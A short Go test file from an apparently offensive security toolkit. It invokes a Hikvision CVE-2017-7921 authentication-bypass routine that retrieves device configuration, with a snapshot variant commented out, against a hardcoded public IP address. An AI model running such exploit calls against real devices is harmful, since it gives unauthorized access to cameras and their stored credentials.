package hikvision

import (
	"fmt"
	"slack-wails/lib/clients"
	"testing"
)

func TestHikvision(t *testing.T) {
	URL := "http://47.150.37.246:81/"
	// resp := CVE_2017_7921_Snapshot(URL, clients.DefaultClient())
	// fmt.Printf("resp: %v\n", resp)

	resp := CVE_2017_7921_Config(URL, clients.DefaultClient())
	fmt.Printf("resp: %v\n", resp)
}
